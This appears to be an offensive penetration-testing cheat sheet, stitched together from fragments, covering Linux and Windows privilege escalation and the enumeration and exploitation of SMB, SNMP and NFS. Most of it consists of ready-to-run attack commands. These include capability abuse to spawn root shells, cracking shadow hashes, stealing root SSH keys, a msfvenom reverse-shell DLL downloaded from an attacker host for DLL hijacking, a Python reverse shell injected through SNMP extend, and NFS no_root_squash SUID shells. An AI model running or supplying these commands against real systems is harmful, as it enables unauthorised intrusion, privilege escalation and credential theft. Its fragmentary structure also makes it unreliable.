Race a SUID file-reader that checks one path but opens the file after a symlink swap.

# 1. Inspect the SUID reader and confirm it can read allowed files.
ls -la
./readfile /etc/passwd

# 2. Confirm the protected file is denied directly.
./readfile /etc/shadow

# 3. Create a symlink to an allowed file and test it.
ln -s /etc/passwd link
./readfile link

# 4. In one session, continuously swap the symlink target.
while true; do ln -sfT /etc/shadow link; ln -sfT /etc/passwd link; done &

# 5. In another session, repeatedly trigger the reader until /etc/shadow leaks.

Find dangerous Linux capabilities and abuse high-impact ones such as `cap_setuid` or `cap_dac_read_search`.

# Discover file capabilities.
getcap -r / 2>/dev/null

# Inspect process capabilities if a PID is interesting.
cat /proc/<PID>/status | grep Cap

# High-value examples:
# cap_setuid            -> can switch UID, often direct root shell on interpreters.
# cap_dac_override      -> can bypass file permissions.
# cap_dac_read_search   -> can read files regardless of DAC permissions.
# cap_sys_admin         -> broad privileged capability, investigate carefully.
# cap_net_raw           -> raw socket access; usually not direct privesc.
# cap_net_bind_service  -> can bind low ports, usually not direct privesc by itself.

# Python with cap_setuid.
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
id && whoami

# Perl with cap_setuid.
/usr/bin/perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/bash";'
id && whoami

# Tar with cap_dac_read_search: read root-only files.
/usr/bin/tar -cvf shadow.tar /etc/shadow
/usr/bin/tar -xvf shadow.tar
cat etc/shadow
Use `cap_dac_read_search` on archive tools to steal root-only credentials or keys.

/usr/bin/tar -cvf shadow.tar /etc/shadow

john shadow --wordlist=/usr/share/wordlists/rockyou.txt

# Victim: if root SSH key is readable through tar capability.

/usr/bin/tar -xvf key.tar
cat root/.ssh/id_rsa

# Attacker: use the copied key.
chmod 600 id_rsa
ssh -i id_rsa root@<TARGET_IP>

.\SigmaPotato.exe "net localgroup Administrators <USER> /add"

.\SigmaPotato.exe --revshell <LHOST> <LPORT>

Use JuicyPotato on older Windows builds when CLSID-based COM abuse is viable.

blocks.text: Quick Windows privesc checklist for user context, services, installer policy, and interesting software paths.

# OS and architecture.
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"

# Current user, groups, and privileges.
whoami
whoami /priv
whoami /groups
whoami /all

# Users and local administrators.
net users
net localgroup administrators

# Scheduled tasks. Look for tasks running as SYSTEM and non-Microsoft task paths.
schtasks /query /fo LIST /v
Get-ScheduledTask | Where-Object { $_.TaskPath -notlike "\Microsoft*" } | Format-Table TaskName,TaskPath,State

# List services and look for unquoted paths.
net start
sc query
Get-Service
wmic service get name,displayname,pathname,startmode
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\\Windows\\"
icacls "C:\Path\To\Service.exe"

# AlwaysInstallElevated registry keys.
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Installed software and common writable install paths.
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | Select-Object DisplayName
dir C:\
dir "C:\Program Files"
dir "C:\Program Files (x86)"
dir C:\ProgramData
Search common Windows locations for saved credentials, unattended install files, vault entries, private keys, and PowerShell history.

:: Registry password searches.
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

:: File and config searches.
dir /s /b *pass* *cred* *vnc* *.config*
findstr /si password *.xml *.ini *.txt *.config
dir C:\ /s /b | findstr /i pass

:: Unattended install files.
type C:\Unattend.xml
type C:\Windows\Panther\Unattend.xml
type C:\Windows\system32\sysprep.inf

:: Windows credential stores.
cmdkey /list
vaultcmd /listcreds:"Windows Credentials" /all

:: Private keys and KeePass databases.
dir /s /b C:\*.kdbx C:\*.ppk C:\*.pem C:\*.key
powershell -c "Get-ChildItem -Recurse -ErrorAction SilentlyContinue -Filter *.kdbx"

:: PowerShell history.
dir C:\Users\<USER>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine
type C:\Users\<USER>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
Check autorun registry keys for writable executable paths or command values that run at logon.
Check AutoLogon values for plaintext credentials that can be reused locally or laterally.

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

:: High-signal values to review.
:: DefaultDomainName
:: DefaultUserName
:: DefaultPassword

blocks.text: Find a missing DLL loaded by a privileged service, place a malicious DLL there, and restart the service.

# 1. In Procmon, filter for missing DLL loads from privileged services:
# Result contains NAME NOT FOUND
# User contains NT
# Path ends with dll
# Path contains System32 -> exclude

# 1b. Check PATH directories for write access.
for %A in ("%path:;="" "%") do (cmd.exe /c icacls "%~A" 2>nul | findstr /i "(F) (M) (W) :..I)" | findstr /i ":\\" && echo %~A)

# 2. Attacker: create a DLL payload.
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f dll -o exp.dll

# 3. Target: download the DLL into the missing DLL path.
certutil -urlcache -split -f "http://<LHOST>/exp.dll" "C:\LabService\VERSION.dll"

# 4. Target: restart the service if possible, or reboot as a last resort.
sc stop <SERVICE_NAME>
sc start <SERVICE_NAME>
shutdown /s /f /t 0

python -m http.server 80

iwr -Uri http://<LHOST>/TextShaping.dll -OutFile 'C:\FileZilla\FileZilla FTP Client\TextShaping.dll'

# 4. Target PowerShell: restart the application to trigger the payload.
Stop-Process -Name filezilla -Force
Start-Process 'C:\FileZilla\FileZilla FTP Client\filezilla.exe'

blocks.text: Quick anonymous SMB checks: fingerprint the host and try null-session share access.

# Fingerprint the target and pull hostname/domain/signing details.
nxc smb <TARGET_IP>

# Test null session / anonymous share access.
nxc smb <TARGET_IP> -u '' -p '' --shares
smbclient -L //<TARGET_IP>/ -N
Check share access with valid creds and open a specific share.

# List shares with valid credentials.
nxc smb <TARGET_IP> -u <USER> -p '<PASS>' --shares
smbmap -H <TARGET_IP> -u <USER> -p '<PASS>'
smbclient -L //<TARGET_IP>/ -U '<DOMAIN>/<USER>%<PASS>'

# Open a specific share.
smbclient //<TARGET_IP>/<SHARE> -U '<DOMAIN>/<USER>%<PASS>'
Open a share with pass-the-hash when plaintext credentials are not available.
Build a user/group list with anonymous RPC if allowed.
Run broad SMB/RPC/LDAP enumeration and save structured output.

enum4linux-ng -A <TARGET_IP>
enum4linux-ng -A <TARGET_IP> -oY enum4linux.yaml
enum4linux-ng -A <TARGET_IP> -oJ enum4linux.json
enum4linux-ng -U <TARGET_IP>
enum4linux-ng -S <TARGET_IP>
Run classic `enum4linux`, extract candidate usernames, review descriptions for hints, and confirm lockout policy before spraying.

# Run broad checks without creds and save output.
enum4linux -a <TARGET_IP> | tee loot/enum4.txt

# Extract usernames from common enum4linux formats.
{ grep -oP 'user:\[\K[^\]]+' loot/enum4.txt; grep -oP 'Account:\s*\K\S+' loot/enum4.txt; } | grep -viE '^(guest|krbtgt)$' | sort -u | while read -r u; do
  grep -qxF "$u" users.txt 2>/dev/null || echo "$u" >> users.txt
done

# Review descriptions and password-looking lines.
grep -i 'Desc' loot/enum4.txt | grep -oP 'Desc:.*'
grep -iE 'pass|pwd|credential|reminder' loot/enum4.txt

# Check lockout policy before spraying.
grep -iR 'Lockout Threshold' loot/enum4.txt

Use NetExec RID brute to extract domain usernames when anonymous or low-privileged SMB access leaks SIDs.

nxc smb <TARGET_IP> -u anonymous -p '' --rid-brute 5000 > rid.txt
cat rid.txt | grep SidTypeUser | awk '{print $6}' | cut -d'\\' -f2 | grep -v '\$$' > users.txt

# Spider one specific share.

# Download files from a readable share.

recurse ON
prompt OFF
mget *

# One-shot download from a specific readable share.
smbclient '//<TARGET_IP>/<SHARE>' -U '<DOMAIN>/<USER>%<PASS>' -c 'recurse ON; prompt OFF; mget *'

Enumerate SNMP with a known community string. Default is often `public`.
Collect the SNMP tree with a known community string. Default is often `public`.

snmpbulkwalk -c <COMMUNITY> -v2c <TARGET_IP> . | tee enum/bulk-snmp
grep -oP '::.*?\.' enum/bulk-snmp | sort | uniq -c | sort -n
grep hrSWRun enum/bulk-snmp | less

# System info, hostname, OS, contact, and location.
snmpwalk -v2c -c <COMMUNITY> -Oa <TARGET_IP> 1.3.6.1.2.1.1

# Processes and process arguments.
snmpwalk -v2c -c <COMMUNITY> -Oa <TARGET_IP> 1.3.6.1.2.1.25.4.2.1.2
snmpwalk -v2c -c <COMMUNITY> -Oa <TARGET_IP> HOST-RESOURCES-MIB::hrSWRunParameters

# Installed software, interfaces, and TCP connections.
snmpwalk -v2c -c <COMMUNITY> -Oa <TARGET_IP> 1.3.6.1.2.1.25.6.3.1.2
snmpwalk -v2c -c <COMMUNITY> -Oa <TARGET_IP> 1.3.6.1.2.1.2.2
snmpwalk -v2c -c <COMMUNITY> -Oa <TARGET_IP> 1.3.6.1.2.1.6.13.1.3

# Windows users, shares, services, and domain/workgroup.
snmpwalk -v2c -c <COMMUNITY> -Oa <TARGET_IP> LANMAN-MIB::lmUserAdminName
snmpwalk -v2c -c <COMMUNITY> -Oa <TARGET_IP> LANMAN-MIB::lmShareName
snmpwalk -v2c -c <COMMUNITY> -Oa <TARGET_IP> LANMAN-MIB::lmSvcName
snmpwalk -v2c -c <COMMUNITY> -Oa <TARGET_IP> LANMAN-MIB::lmDomainName

# System info, processes, process arguments, packages, interfaces, and TCP connections.

snmpwalk -v2c -c <COMMUNITY> -Oa <TARGET_IP> 1.3.6.1.2.1.25.4.2.1.2

snmpwalk -v2c -c <COMMUNITY> -Oa <TARGET_IP> 1.3.6.1.2.1.6.13.1.3

# NET-SNMP extend scripts and command definitions.

snmpwalk -v2c -c <COMMUNITY> -Oa <TARGET_IP> NET-SNMP-EXTEND-MIB::nsExtendCommand

Example 3 - bulk tree query with `braa` or a manual `snmpwalk` fallback.
Prepare tooling, create an SNMP extend reverse shell command, and trigger it.

# Attacker: prepare snmp-shell locally.
sudo apt install snmp snmp-mibs-downloader rlwrap -y
git clone https://github.com/mxrch/snmp-shell
cd snmp-shell
sudo python3 -m pip install -r requirements.txt

# Attacker: create an SNMP extend reverse shell command using a writeable community string.
snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c <COMMUNITY> <TARGET_IP> 'nsExtendStatus."command10"' = createAndGo 'nsExtendCommand."command10"' = /usr/bin/python3 'nsExtendArgs."command10"' = '-c "import sys,socket,os,pty;s=socket.socket();s.connect((\"<LHOST>\",<LPORT>));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")"'

# Attacker: trigger the SNMP extend command with the same writeable community string.
snmpwalk -v 2c -c <COMMUNITY> <TARGET_IP> nsExtendObjects
Mount an exported NFS share, inspect/copy files, then unmount it.

# Create local mount directory.
mkdir nfs_mount

# Mount exported NFS share.
sudo mount -t nfs <TARGET_IP>:/<REMOTE_SHARE> nfs_mount -o nolock,vers=3

# List mounted files.
ls -la nfs_mount

# Copy interesting files locally.
cp nfs_mount/<FILE> .

# Unmount NFS share.
sudo umount nfs_mount
If an exported NFS share has `no_root_squash`, mount it from the attacker box as root, create a SUID shell, then execute it on the target.

# Target or attacker: confirm exported shares and look for no_root_squash if /etc/exports is readable.
showmount -e <TARGET_IP>
cat /etc/exports 2>/dev/null | grep no_root_squash

# Attacker: mount the exported share.
mkdir nfs_privesc
sudo mount -t nfs <TARGET_IP>:/<REMOTE_SHARE> ./nfs_privesc -o nolock,vers=3

# Attacker as root: create a SUID bash copy inside the mounted share.
sudo cp /bin/bash ./nfs_privesc/rootbash
sudo chmod +s ./nfs_privesc/rootbash

# Target: execute the SUID bash from the mounted/exported path.
/<EXPORTED_PATH>/rootbash -p
id && whoami
RPCBind NFS Loot Via FTP Copy
If NFS exports are exposed through RPCBind and FTP allows `SITE CPFR/CPTO`, copy a private key into an exported path, mount it, then SSH with the key.

# Enumerate RPCBind/NFS exports.
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount <TARGET_IP>

# FTP: copy a readable private key into an NFS-exported writable/readable path.
nc <TARGET_IP> 21
SITE CPFR /home/<USER>/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa

# Attacker: mount the exported path and retrieve the copied key.
mkdir nfs_loot
sudo mount -t nfs <TARGET_IP>:/var ./nfs_loot -o nolock,vers=3
cp ./nfs_loot/tmp/id_rsa .
chmod 600 id_rsa

# Use the looted private key.
ssh -i id_rsa <USER>@<TARGET_IP>
